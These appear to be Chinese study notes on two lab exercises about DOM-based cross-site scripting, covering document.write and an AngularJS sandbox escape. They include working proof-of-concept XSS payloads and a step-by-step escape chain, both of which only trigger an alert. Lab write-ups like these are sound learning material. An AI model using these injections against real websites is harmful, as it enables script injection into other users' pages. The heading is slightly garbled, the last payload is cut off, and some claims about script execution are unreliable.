2.DOM XSS 在 sack 中使用源代码document.write``location.search

理解DOM漏洞原理

  • 源 (Source)：location.search，这是浏览器地址栏中 ? 后面的部分（也就是 GET 参数）。攻击者可以完全控制这部分。
  • 汇 (Sink)：document.write。这个函数会将传入的字符串直接解析为 HTML 写入页面。如果传入的数据包含 <script> 标签，它通常不会执行（这是很多人的误区）。
  • 关键点：在 document.write 的上下文中，最可靠的 XSS 触发方式不是 <script>alert(1)</script>，而是HTML 事件处理器，例如 <img src=x onerror=alert(1)>。

这里简单说说原理，

  • <img：这是一个标准的 HTML 图片标签的开始。浏览器看到它，就会准备去加载一张图片。

11.DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

描述：

本实验室在搜索功能中的AngularJS表达式中包含基于DOM的跨站脚本漏洞。

AngularJS 是一个流行的 JavaScript 库，它扫描包含该属性（也称为 AngularJS 指令）的 HTML 节点的内容。当向HTML代码添加指令时，你可以在双大括号内执行JavaScript表达式。当编码角括号时，这种技术非常有用。ng-app

要解决这个实验，可以执行跨站脚本攻击，执行AngularJS表达式并调用该函数。alert

没办法直接通过源码找到了

试了一下没头绪去查了一下资料：

AngularJS 表达式注入

AngularJS 1.x 版本有一个沙箱机制，原本目的是限制表达式能访问的 JavaScript 全局对象（如 window、document），防止开发者意外执行危险代码。但这个沙箱曾被多次绕过，本题利用的就是其中一种经典绕过链。

攻击流程：

  1. 进入 AngularJS 上下文：通过 {{}} 让 Angular 解析用户输入
  2. 获取函数构造器：利用 constructor.constructor 取得 Function 构造函数
  3. 执行任意代码：用 Function 将字符串转为可执行函数并立即调用

Payload 原型

第一层：{{}} —— 触发 Angular 表达式解析

  • AngularJS 在渲染页面时，会扫描 DOM 中的 {{}} 插值语法
  • 如果 search 参数的值被拼接到 HTML 中，且该 HTML 位于 Angular 的编译范围内（ng-app 指令内），Angular 就会对 {{...}} 内的内容进行表达式求值
  • 这不是简单的字符串拼接，而是真正的 JavaScript 执行环境

第二层：constructor —— 获取当前对象的构造函数

Object.constructor 是 Function，因为 Object 本身是一个函数对象。

第三层：constructor.constructor —— 获取 Function 构造函数

  • 让我们一步步推导：
    • constructor → 当前对象（默认是 Object）的构造函数 → Function
    • 再次调用 .constructor → Function 的构造函数 → Function 本身
  • 所以 constructor.constructor 等价于 Function，即 JavaScript 的全局函数构造器

第四层：('alert(document.domain)') —— 创建新函数

  • Function('alert(document.domain)') 会创建一个新函数，函数体就是字符串中的代码
  • 该函数在全局作用域下执行，因此可以访问 document 对象

第五层：() —— 立即执行

  • 调用这个新创建的函数，alert(document.domain) 立即执行，弹出提示框

payload：on路径短，只有一次属性访问，减少被检测出来的风险
